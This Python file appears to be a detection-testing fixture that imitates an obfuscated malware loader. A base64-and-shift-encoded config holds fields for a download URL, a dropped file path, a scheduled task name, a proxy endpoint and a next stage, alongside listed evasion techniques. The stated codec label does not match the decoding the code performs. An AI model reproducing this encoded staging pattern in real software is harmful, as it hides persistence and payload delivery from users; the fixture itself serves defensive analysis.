#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_5df46720 = ("XyYbZVxdTllcJllbWE9SVU5IUVhcXRVKTFpeUltOSFtOVlhdThVNTkxYTU5ITlZLTk1NTk0VYFtSXU5IT1JVThVNUlxZSl1MUUhZW1hMTlxcZUpNSlldTlsmTFZNSFliXVFYV0hRSldNWE9PZVxdSlBOSExYXlddJh5lXGJXXUphJk1STF1SWFdKW2JITVJcWUpdTFFlWEtPX"
        "lxMSl1SWFcmW05PVU5MXVJfTkhXSlZOSFlVSldlTEpbW1JOWyZZYkpbVlhbSFliUldcXUpVVU5bZWBSV01YYFxITFFKUlcmWVhgTltcUU5VVUhdWEhZYl1RWFdlTEpWWUpSUFdIUk0mTEpWWUpSUFcWIR0dIB4bHxweHGVeW1UmUV1dWVwjGBghHR0gHhsfHB4cF05hSlZZVU"
        "4XUldfSlVSTRgaTxpLTxocHRdZYmVeXE5bSEpQTlddJjFeV11bTlxcOWJdUVhXGCEdHSAeGx8cHhxlT1JVTkhZSl1RJiwjGDlbWFBbSlYtSl1KGDFeV11bTlxcNUpLGBdeWU1KXU4WIR0dIB4bHxweHBdZYmVSV11OW1lbTl1OW0hZSl1RJiwjGDlbWFBbSlYtSl1KGDliXVF"
        "YVxYhHR0gHhsfHB4cGFliXVFYVxdOYU5lXUpcVEhXSlZOJjxiXF1OVj5ZTUpdThYhHR0gHhsfHB4cZVlbWGFiSE5XTVlYUlddJhobIBcZFxkXGiMdHCEfHGVXTmFdSFxdSlBOJlVYTEpVFk1SXFlKXUxRF0tKXWVRSldNWE9PSFJNJjk8OUIWLi4eLh4uGSIZHSEtLB0tKw==")
    CODEC_5df46720 = "base64_chunks|subtract_modulo_256|17"

    def load_5df46720():
        return base64.b64decode(MATERIAL_5df46720)

    def decode_5df46720(v_a19c):
        return bytes((value + 23) % 256 for value in v_a19c)

    def recover_5df46720():
        v_d41a = "left" if 2 > 1 else "right"
        v_b27e = decode_5df46720(load_5df46720())
        v_c304 = v_b27e.decode("ascii", "strict")
        return v_c304

    def inspect_5df46720():
        return recover_5df46720()

    def surface_5df46720():
        routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
        return routes["selected"]()

    def obfuscation_5df46720():
        reflection_plan = ("__import__", "getattr", "reflective_name_plan")
        return reflection_plan[-1]

    def plan_5df46720():
        fields = dict(item.split("=", 1) for item in inspect_5df46720().split("|"))
        analysis_surface = surface_5df46720()
        obfuscation_surface = obfuscation_5df46720()
        operation_plan = ("cmd_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_5df46720())
